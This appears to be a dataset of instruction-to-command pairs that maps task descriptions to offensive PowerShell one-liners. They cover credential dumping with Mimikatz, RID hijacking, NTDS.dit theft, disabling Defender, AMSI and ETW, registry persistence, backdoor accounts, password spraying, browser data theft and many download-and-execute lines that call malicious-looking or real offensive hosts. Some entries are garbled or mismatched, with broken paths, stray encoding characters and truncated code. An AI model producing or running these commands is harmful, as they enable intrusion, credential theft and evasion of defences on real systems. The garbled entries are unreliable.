{"input": "Execute PowerShell code to open the Windows calculator using remote command execution.", "output": "$code = {Invoke-Expression -Command \"calc.exe\"}; Invoke-Command -ScriptBlock $code"}
{"input": "Attempt to perform RID hijacking on the user account \"Peter\" with RID 500.", "output": "Invoke-RIDHijacking -User Peter -RID 500"}
{"input": "Execute a command on a remote host using PowerShell remoting.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { <command> }"}
{"input": "Connect to Azure AD, retrieve the user principal name, and remove the corresponding user.", "output": "Connect-AzureAD ; $userprincipalname = \"${userprincipalname}\" ; Remove-AzureADUser -ObjectId $userprincipalname"}
{"input": "Create a minidump file for the process with ID 3742.", "output": "Out-Minidump -Process (Get-Process -Id 3742)"}
{"input": "Execute a PowerShell script with bypassing execution policy and hiding the window.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1"}
{"input": "Modify the Windows Registry to change the user's shell, possibly for persistence.", "output": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, ${binary}\" -Force"}
{"input": "Invoke Inveigh with HTTP protocol specified as \"N.\"", "output": "Invoke-Inveigh -HTTP N"}
{"input": "Enable PowerShell remoting on the local machine.", "output": "Enable-PSRemoting -Force"}
{"input": "Retrieve the version of the operating system.", "output": "[environment]::OSVersion.Version"}
{"input": "Execute a custom tool named \"xordump_exe\" with specific parameters.", "output": "${xordump_exe} -out ${OutFile} -x 0x41"}
{"input": "Compress files from the specified directory into an archive.", "output": "dir ${InputFile} -Recurse | Compress-Archive -DestinationPath ${OutputFile}"}
{"input": "Execute a hidden PowerShell script with bypassing execution policy.", "output": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File (evil.ps1)"}
{"input": "Remove a SMB share and a file share with specified names.", "output": "Remove-SmbShare -Name ${share_name} ; Remove-FileShare -Name ${share_name}"}
{"input": "Set a file path and execute the corresponding PowerShell script.", "output": "$FilePath = \"C:\\payload.ps1\"; Invoke-Expression -Command $FilePath"}
{"input": "Download and execute code from an untrusted URL on a remote computer.", "output": "Invoke-Command -ComputerName <TargetIP> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('<UntrustedURL>') }"}
{"input": "Perform DNS lookup for the specified IP address.", "output": "nslookup ${remote.host.ip}"}
{"input": "Download and execute PowerShell code from a remote server.", "output": "$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code"}
{"input": "Search for indexed items with specific criteria.", "output": "Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='idCard'"}
{"input": "Execute obfuscated PowerShell script from a remote GitHub repository.", "output": "powershell.exe -ep bypass -c (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"}
{"input": "Invoke a WMI command to create a process on a remote node.", "output": "wmic /node:${node} process call create \"rundll32.exe ${dll_to_execute} ${function_to_execute}\""}
{"input": "Download and execute PowerShell code from a potentially malicious website.", "output": "Invoke-Expression -Command ï¿½ IEX (New-Object Net.WebClient).DownloadString('http://dangerExample.com/Kern132.ps1')"}
{"input": "Download and execute PowerShell code from a potentially malicious URL.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious.ps1')\""}
{"input": "Attempt to perform RID hijacking using the Guest account with RID 500.", "output": "Invoke-RIDHijacking -UseGuest -RID 500"}
{"input": "Download and execute PowerShell code from a potentially malicious GitHub repository on a remote system.", "output": "Invoke-Command -ComputerName <remote_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')}"}
{"input": "Retrieve group memberships for a specified Active Directory user.", "output": "get-ADPrincipalGroupMembership ${user} | select name"}
{"input": "Modify PowerShell profile to add content and start a process.", "output": "Add-Content ${ps_profile} -Value \"\" ; Add-Content ${ps_profile} -Value \"Start-Process ${exe_path}\" ; powershell -Command exit"}
{"input": "Create a Unicode-encoded string in PowerShell.", "output": "$a = \"Write-Host 'Hello World!'\";  $b = [System.Text.Encoding]::Unicode.Get"}
{"input": "Execute a PowerShell script with specific execution settings and encoded command.", "output": "powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass -Encode dCommand <Base64Encode dScript>"}
{"input": "Perform DNS resolutions in a loop with random subdomains.", "output": "for($i=0; $i -le ${query_volume}; $i++) { Resolve-DnsName -type \"${queryType}\" \"${Subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).${Domain}\" -QuickTimeout}"}
{"input": "Attempt privilege escalation to achieve system-level access.", "output": "Get-System -RevToSelf"}
{"input": "List configuration information for application pools using appcmd.exe.", "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config"}
{"input": "Read content from a file and send it as a POST request to a specified IP address.", "output": "$content = Get-Content ${input_file} ; Invoke-WebRequest -Uri ${ip_address} -Method POST -Body $content"}
{"input": "Use NinjaCopy to copy the NTDS.dit file from a remote server to a local destination.", "output": "$NtdsBytes = Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -ComputerName 'Server1' -LocalDestination 'c:\\test;tds.dit'"}
{"input": "Pause the execution for 60 seconds.", "output": "sleep 60"}
{"input": "Change directory to the temporary folder and execute Kerbrute for Kerberos bruteforcing.", "output": "cd $env:temp ; .\\kerbrute.exe bruteforce --dc ${domaincontroller} -d ${domain} $env:temp\\bruteforce.txt"}
{"input": "Use NinjaCopy to copy the NTDS.dit file from a local path to a remote destination on a server.", "output": "Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'"}
{"input": "Invoke Mimikatz to dump credentials on multiple computers.", "output": "Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2)"}
{"input": "Execute PowerShell code stored in the variable \"adrecon_path\" using Invoke-Expression.", "output": "Invoke-Expression ${adrecon_path}"}
{"input": "Attempt to elevate privileges to achieve system-level access.", "output": "Get-System"}
{"input": "Install a new web global module with specified name and DLL path.", "output": "New-WebGlobalModule -Name ${module_name} -Image ${dll_path}"}
{"input": "Execute malicious code on a remote system using PowerShell remoting.", "output": "Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}"}
{"input": "Download and execute PowerShell code from a potentially malicious server.", "output": "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.example.com/hack_script')\""}
{"input": "Invoke an HTML Application (HTA) with specific parameters.", "output": "Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -MSHTAFilePath ${mshta_file_path}"}
{"input": "Execute a PowerShell script with specific execution settings.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File Win32.ps1"}
{"input": "Retrieve and group indexed items based on specific criteria.", "output": "Get-IndexedItem -Filter 'System.Kind = 'Music' AND AlbumArtist like '%' ' | Group-Object -NoElement -Property 'AlbumArtist' | sort -Descending -property count"}
{"input": "Inject DLL payload into a running process using mavinject and then stop the notepad process.", "output": "$mypid = ${process_id} ; mavinject $mypid /INJECTRUNNING ${dll_payload} ; Stop-Process -processname notepad"}
{"input": "Execute PsExec to add a user with specific credentials on a remote computer.", "output": "Invoke-PsExec -ComputerName 192.168.50.200 -Command 'net user backdoor password123 /add' -ServiceName Updater32"}
{"input": "Copy the Opera browser's login data to the temporary folder.", "output": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp"}
{"input": "Create a new registry item to disable Event Tracing for Windows (ETW).", "output": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force"}
{"input": "Download and execute a Metasploit payload from a specified URL.", "output": "Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl"}
{"input": "Execute a PowerShell script with bypassing execution policy.", "output": "powershell.exe -ExecutionPolicy ByPass -NoProfile -File \"C:\\evil.ps1\""}
{"input": "Attempt to perform RID hijacking on the user account \"Alex\" with RID 500.", "output": "Invoke-RIDHijacking -User Alex -RID 500"}
{"input": "Encode and execute Mimikatz code using Win32 API.", "output": "$code = 'Invoke-Mimikatz'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $handle = [Win32.WinApi]::ExecuteCode($bytes)"}
{"input": "Execute custom PowerShell code on a remote host.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { < code > }"}
{"input": "Create a new registry item to disable privacy experience during Windows Out-Of-Box Experience (OOBE).", "output": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force"}
{"input": "Modify Windows Defender settings to disable anti-spyware features.", "output": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1"}
{"input": "Create a minidump file for the process with ID 2929.", "output": "Out-Minidump -Process (Get-Process -Id 2929)"}
{"input": "Start a process and then launch a new process under a specific parent with specified parameters.", "output": "Start-Process -FilePath ${parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}'"}
{"input": "Execute a PowerShell script with bypassing execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Juve.ps1\""}
{"input": "Exploit a backdoor in a LNK file for malicious activities.", "output": "Invoke-BackdoorLNK -LNKPath C:\\Users\\john\\Desktop\\Firefox.lnk -EncScript AA..."}
{"input": "Download and execute a file from a potentially malicious server using Invoke-Expression.", "output": "Invoke-Expression -Command \"& { (New-Object Net.WebClient).DownloadFile('http://malicious_server.com/malicious_')}\""}
{"input": "Download and execute PowerShell code from a potentially malicious server with specific encoding.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass �iex (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')�"}
{"input": "Copy an Excel VBA add-in to the Excel startup folder and start Excel.", "output": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART ; otepad.xlam\" ; Start-Process \"Excel\""}
{"input": "Retrieve a PowerShell script for post-hashdump actions and execute it.", "output": "$enc = Get-PostHashdumpScript ; powershell.exe -command $enc"}
{"input": "Retrieve information about Active Directory replication accounts on a specific server.", "output": "Get-ADReplAccount -All -Server ${logonserver}"}
{"input": "Retrieve information about domain accounts using the \"net accounts\" command.", "output": "net accounts /domain"}
{"input": "Attempt to perform RID hijacking on the user account \"Robert\" with RID 1002 and a specified password.", "output": "Invoke-RIDHijacking -User Robert -RID 1002 -Password Password9 -Enable"}
{"input": "Download and execute PowerShell code from a chain of commands using Invoke-Expression.", "output": "Invoke-Expression -Command \"Invoke-WebRequest -Uri 'http://malicious.site/malicious.ps1' | Invoke-Expression\""}
{"input": "Retrieve information about child items in the specified path.", "output": "Get-ChildItem -Path ${host.system.path}"}
{"input": "Map a new PowerShell drive to a specified network share.", "output": "New-PSDrive -name ${map_name} -psprovider filesystem -root \\\\${computer_name}\\${share_name}"}
{"input": "Download and execute PowerShell code from a potentially malicious URL with bypassing execution policy.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious-script.ps1')\""}
{"input": "Execute the Windows calculator using Invoke-Expression.", "output": "Invoke-Expression -Command \"calc.exe\""}
{"input": "Execute Mimikatz using Invoke-Expression.", "output": "Invoke-Expression -Command \"Invoke-Mimikatz\""}
{"input": "Retrieve the path of the current process, construct an injection command, and execute reflective PE injection.", "output": "$process = (Get-Process -Id $pid).Path; $injection = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExePath $($process)\""}
{"input": "Retrieve information about the default web browser.", "output": "Get-BrowserInformation"}
{"input": "Perform DNS MX record lookup for a specified domain and filter the output for mail-related information.", "output": "(nslookup -querytype=mx ${target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()"}
{"input": "Inject shellcode into a process with ID 7880.", "output": "Invoke-Shellcode -ProcessId 7880"}
{"input": "Download and execute PowerShell code from a specified URL with bypassing execution policy.", "output": "powershell.exe -nop -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('https://malicious.url/malicious_script.ps1');ï¿½"}
{"input": "Execute a hidden PowerShell command", "output": "Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"}
{"input": "Attempt to load Mimikatz into the PowerShell profile for future execution.", "output": "$profile = $profile + \"`n\" + \"Invoke-Mimikatz\"; Invoke-Expression $profile"}
{"input": "Send a malicious email with an attachment for test purposes.", "output": "Send-MailMessage -From ${sender} -To ${receiver} -Subject 'T1027_Atomic_Test' -Attachments ${input_file} -SmtpServer ${smtp_server}"}
{"input": "Download and execute a malicious payload from a remote server.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-payload.ps1')\""}
{"input": "Execute a DLL through WMI on a remote node using rundll32.", "output": "wmic /node:${node} process call create \"rundll32.exe ${your_dll} ${YourFuctionToExecute}\""}
{"input": "Execute PowerShell with a hidden window and bypass execution policy to run malicious code.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand [Base64 encoded malicious code]"}
{"input": "Execute a Base64-encoded PowerShell script with hidden window and bypassing execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64EncodedScript')))\""}
{"input": "Execute a malicious PowerShell script with execution policy bypass and a hidden window.", "output": "powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -file malicious.ps1"}
{"input": "Query PnP entities to find imaging devices on the system.", "output": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Img' OR PNPClass = 'Cam')\""}
{"input": "Run Inveigh tool with specific spoofing configurations.", "output": "Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76"}
{"input": "Search for files with the name \"Formula 1\" on a remote server's 'users' share.", "output": "Finds files entitled Formula 1 on the 'users' share of a remote server named 'Atom-Engine'"}
{"input": "Perform RID Hijacking on the host with RID 500 and specified password.", "output": "Invoke-RIDHijacking -UseHost -RID 500 -Password Password1"}
{"input": "Start recording the webcam for 15 seconds and save the output to 'C:\\webcam.mkv'.", "output": "Start-WebcamRecorder -RecordTime 15 -OutPath 'C:\\webcam.mkv'"}
{"input": "Encrypt a file using GPG with specified GPG executable and file locations.", "output": "cmd /c '${GPG_Exe_Location}' -c '${File_to_Encrypt_Location}'"}
{"input": "Compress files in the specified input path and save the archive to the specified destination path.", "output": "Compress-Archive -Path ${InputF} -DestinationPath ${OutputF} -Force"}
{"input": "Invoke a command on a remote computer to download and execute a malicious script.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }"}
{"input": "Execute a PowerShell script named Kern64.ps1 with execution policy bypass.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File Kern64.ps1"}
{"input": "Perform credential injection targeting the domain 'demo' and the 'administrator' account with a new winlogon session.", "output": "Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -NewWinLogon -AuthPackage Msv1_0"}
{"input": "Import the PowerView module and retrieve information about domain computers.", "output": "Import-Module .\\powerview.ps1; ; Get-DomainComputer"}
{"input": "Copy Microsoft Edge user data to a temporary folder.", "output": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse"}
{"input": "Modify the creation time of files in the specified path to the target date and time.", "output": "Get-ChildItem ${file_path} | % { $_.CreationTime = \"${target_date_time}\" }"}
{"input": "Manipulate tokens to create a new process (cmd.exe) with a specific thread ID.", "output": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 323"}
{"input": "Retrieve information about Win32 processes using WMI.", "output": "get-wmiObject -class Win32_Process"}
{"input": "Perform RID Hijacking on the guest account with RID 500 and specified password.", "output": "Invoke-RIDHijacking -UseGuest -RID 500 -Password Password1"}
{"input": "Retrieve information about SMB shares on the system.", "output": "get-smbshare"}
{"input": "Run the Nightmare tool to create a new user 'Pedrol' with password 'password1' and specified driver name.", "output": "Invoke-Nightmare -NewUser 'Pedrol' -NewPassword 'password1' -DriverName 'driver'"}
{"input": "Invoke a command on a remote server using PowerShell with specific options and an encoded command.", "output": "Invoke-Command -ComputerName [REMOTE_SERVER] -ScriptBlock { PowerShell.exe -NoP -NonI -W Hidden -Enc [ENcode D_COMMAND] }"}
{"input": "Change the current location to the specified folder and run a PowerShell script with specific parameters.", "output": "Set-Location PathToAtomicsFolder ; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain ${domain} -Subdomain ${subdomain} -QueryType ${query_type}"}
{"input": "Invoke a PowerShell command on a remote system using the specified PowerShell code.", "output": "Invoke-Command -ComputerName <remote_system_name> -ScriptBlock {<powershell_code>}"}
{"input": "Download and execute a script from a remote URL to dump Windows credentials.", "output": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1') ; Invoke-WCMDump"}
{"input": "Retrieve Group Policy Preferences passwords.", "output": "Get-GPPPassword"}
{"input": "Download and execute a PowerShell script from a remote server.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://heavy-exploit.site/evilexample.ps1')\""}
{"input": "Manipulate tokens to create a new process (cmd.exe) with the username 'nt authority\\system'.", "output": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username nt authority\\system"}
{"input": "Execute a PowerShell script named maliciousscript.ps1 with execution policy bypass.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File maliciousscript.ps1"}
{"input": "Execute PowerShell code with hidden window, no profile, and loading code from the file WinPwn.ps1.", "output": "powershell -w hidden -nop -c $x=(gc c:\\WinPwn.ps1);iex $x"}
{"input": "Retrieve indexed items from the specified path, filter by camera maker, and group by focal length.", "output": "Get-IndexedItem -path c:\\ -recurse  -Filter cameramaker=pentax! -Property focallength | group focallength -no | sort -property @{e={[double]$_.name}}"}
{"input": "Perform credential injection targeting the domain 'demo' and the 'administrator' account with an existing winlogon session using NetworkCleartext logon type.", "output": "Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -ExistingWinLogon -LogonType NetworkCleartext"}
{"input": "Change the current directory to the temporary folder, run the Kerbrute tool to brute force user accounts, and output results to a file.", "output": "cd $env:temp ; .\\kerbrute.exe bruteuser --dc ${domaincontroller} -d ${domain} $env:temp\\bruteuser.txt TestUser1"}
{"input": "Stop and remove a specified service by name.", "output": "Stop-Service -Name ${service_name} ; Remove-Service -Name ${service_name}"}
{"input": "Start a foreground BITS transfer from a remote source to a local destination.", "output": "Start-BitsTransfer -Priority foreground -Source ${remote_file} -Destination ${local_file}"}
{"input": "Download and execute a PowerShell script from a remote server with bypassed execution policy.", "output": "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malware/kernF1.ps1')\""}
{"input": "Remove a specific AMSI provider registry key.", "output": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse"}
{"input": "Execute the Backstab64 tool with specific options and process name.", "output": "& $env:temp\\Backstab64.exe -k -n ${process_name}"}
{"input": "Invoke a command on a remote server to start a process with the specified file path.", "output": "Invoke-Command -ComputerName [RemoteServer] -ScriptBlock { Start-Process -FilePath \"C:\\malware.exe\" }"}
{"input": "Create or overwrite a text file named 'message.txt' with the specified content.", "output": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'"}
{"input": "Execute Mimikatz in memory to dump credentials with bypassed execution policy.", "output": "powershell.exe -exec bypass -c \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Create a new registry item to run a specified command automatically.", "output": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${cmd}\" -PropertyType \"String\""}
{"input": "Invoke a command on a remote computer to download and execute a malicious PowerShell script.", "output": "Invoke-Command -ComputerName <Victim IP> -ScriptBlock {IEX (New-Object Net.Webclient).DownloadString('http://heavy-server.com/malware.ps1')}"}
{"input": "Analyze PowerShell command line parameters for potential attack vectors.", "output": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ${command_line} -CommandParamVariation ${command_param_variation} -Execute -ErrorAction Stop"}
{"input": "Download and execute a PowerShell script from a specific GitHub repository with hidden window and no profile.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\""}
{"input": "Perform RID Hijacking on a specific user (Anna) with RID 1002, using a specified password and enabling the hijack.", "output": "Invoke-RIDHijacking -User Anna -RID 1002 -Password Password4 -Enable"}
{"input": "Run the Inveigh tool in inspection mode.", "output": "Invoke-Inveigh -Inspect"}
{"input": "Create a new Windows service with a specified name and binary path, then start the service.", "output": "New-Service -Name \"${ServiceName}\" -BinaryPathName \"${BinaryPath}\" ; Start-Service -Name \"${ServiceName}\""}
{"input": "Display Resultant Set of Policy for the current user or system.", "output": "gpresult /R"}
{"input": "Retrieve indexed items matching the filter 'stingray' from the My Pictures folder and its subfolders.", "output": "Get-IndexedItem -filter stingray -path ([system.environment]::GetFolderPath( [system.environment+specialFolder]::MyPictures )) -recurse"}
{"input": "Set Windows Defender exclusion path using the specified variable.", "output": "$excludedpath= \"${excluded_folder}\" ; Add-MpPreference -ExclusionPath $excludedpath"}
{"input": "Copy Sandcat executable to a remote system's 'Public' folder on the C drive.", "output": "$path = \"sandcat.go-windows\"; ; $drive = \"\\\\${remote.host.fqdn}\\C$\"; ; Copy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";"}
{"input": "Invoke a malicious HTML Application (HTA) file with specific options and simulate lateral movement.", "output": "Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath ${mshta_file_path}"}
{"input": "Retrieve information about Chromium browsers using SharpChromium.", "output": "Get-SharpChromium -Type all"}
{"input": "Execute a PowerShell script named <rootFile.ps1> with bypassed execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -File <rootFile.ps1>"}
{"input": "Invoke a command on a remote computer to download and execute a malicious PowerShell script from a specific URL.", "output": "Invoke-Command -ComputerName $target -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')}"}
{"input": "Download and execute a PowerShell script from a potentially malicious source.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://threat.com/Kernel32.ps1')\""}
{"input": "Retrieve Active Directory users with specific account control flags and format the output table.", "output": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"}
{"input": "Start a process with the specified executable path (Ammyy Admin).", "output": "Start-Process ${Ammyy_Admin_Path}"}
{"input": "Use nltest to retrieve information about the domain controller for the current user's domain.", "output": "nltest /dsgetdc:$env:USERDOMAIN"}
{"input": "Download and execute a remote script, then use Mimikatz to dump credentials.", "output": "IEX (New-Object Net.WebClient).DownloadString('${remote_script}'); Invoke-Mimikatz -DumpCreds"}
{"input": "Retrieve Internet Explorer bookmarks information for a specified user.", "output": "Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user3"}
{"input": "Download and execute a PowerShell script from a potentially illegal website.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')"}
{"input": "Download and execute a PowerShell script from a specific GitHub repository with hidden window and no profile.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5775/WinPwn.ps1')\""}
{"input": "Perform reflective PE injection using specified PE bytes and execution arguments.", "output": "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs '-NoP -sta -w 1 -enc <base64 encoded powershell command>'"}
{"input": "Execute a PowerShell script file with bypassing execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -File script.ps1"}
{"input": "Perform egress network checks to specified IP and port ranges with a delay and verbose output.", "output": "Invoke-EgressCheck -ip 1.2.3.4 -portrange '22-25,53,80,443,445,3306,3389' -protocol ALL -delay 100 -verbose"}
{"input": "Execute Mimikatz to dump credentials and save the results to a file.", "output": "Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds | Out-File C:\\credentials.txt'"}
{"input": "Download and execute a PowerShell script from a remote site (exampleExploit.com).", "output": "IEX (New-Object Net.WebClient).DownloadString('http://exampleExploit.com/exploit.ps1')"}
{"input": "Define a PowerShell script in a variable and convert it to Unicode-encoded bytes.", "output": "$a = \"Write-Host 'Hello World!'\"; $b = [System.Text.Encoding]::Unicode.GetBytes($a)"}
{"input": "Execute reflective PowerShell code encoded in SharpGen's format.", "output": "Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"}
{"input": "Install a Security Support Provider (SSP) library from the specified path.", "output": "Install-SSP -Path .\\mimilib.dll"}
{"input": "Clear the command history in PowerShell.", "output": "Clear-History;Clear"}
{"input": "Execute PowerShell code from the specified input file.", "output": "Invoke-Expression ${input_file}"}
{"input": "Access the current user's environment variables in PowerShell.", "output": "$env:user"}
{"input": "Retrieve information about running processes in PowerShell.", "output": "get-process"}
{"input": "Collects information about processes, specifically targeting \"lsass\" process.", "output": "$ps = get-process | select processname,Id; ; $valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} }; ; $valid | ConvertTo-Json"}
{"input": "Attempts to execute commands on a remote system using SMBExec with specified credentials.", "output": "Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0"}
{"input": "Imports a module and performs password spraying against Microsoft 365 accounts using MSOLSpray.", "output": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${UserList}\" -Password \"${pwd}\""}
{"input": "Decodes and executes a Base64-encoded PowerShell command.", "output": "powershell.exe -c \"Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64 encoded string')))\""}
{"input": "Downloads and executes a PowerShell script from a specified URL.", "output": "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.url')\""}
{"input": "Copies a file with specific filtering conditions, likely part of a larger operation.", "output": "Copy-Item ${host.file.path[filters(technique=T1005,max=3)]} ${host.dir.staged[filters(max=1)]}"}
{"input": "Executes Mimikatz to obtain and debug privileges on a remote computer.", "output": "Invoke-Mimikatz -Command privilege::debug exit -ComputerName computer1"}
{"input": "Invokes a command to disable RemoteFX vGPU on a specified module and path.", "output": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName ${module_name} -ModulePath ${module_path}"}
{"input": "Starts a new process using the specified script path.", "output": "Start-Process ${script_path}"}
{"input": "Attempts to add a new user ('SMBExec') with the password 'Winter2017' on a remote system using SMBExec.", "output": "Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'"}
{"input": "Defines and invokes the Mimikatz command using Invoke-Expression.", "output": "$command = \"Invoke-Mimikatz\"; Invoke-Expression $command;"}
{"input": "Downloads and executes a PowerShell script from a potentially untrusted source.", "output": "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://rootLife.it/untrusted')\""}
{"input": "Removes an item specified by the path after joining with the result of a command that retrieves the first item in the prefetch directory.", "output": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch*.pf\" -Name)[0])"}
{"input": "Collects browser history information for the user 'Bob' across all browsers.", "output": "Get-BrowserInformation -Browser All -Datatype History -UserName Bob -Search 'unina'"}
{"input": "Downloads and executes a PowerShell script from a specified URL.", "output": "$url = \"http://exploit.com/WinHack64.ps1\"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)"}
{"input": "Invokes a command on a remote computer to download and execute a malicious PowerShell script.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious_script.ps1')}"}
{"input": "Executes the Windows rundll32.exe command to show the key manager (credential manager) dialog.", "output": "rundll32.exe keymgr,KRShowKeyMgr"}
{"input": "Defines a Mimikatz command and executes it using encoded PowerShell.", "output": "$code = 'Invoke-Mimikatz -DumpCreds'; powershell.exe -encodedcommand $code"}
{"input": "Executes a PowerShell script named 'msysWin.ps1' with specific execution policies.", "output": "powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File msysWin.ps1"}
{"input": "Invokes Inveigh with specified parameters, potentially for network discovery and interception.", "output": "Invoke-Inveigh -IP 192.168.1.10 -HTTP N"}
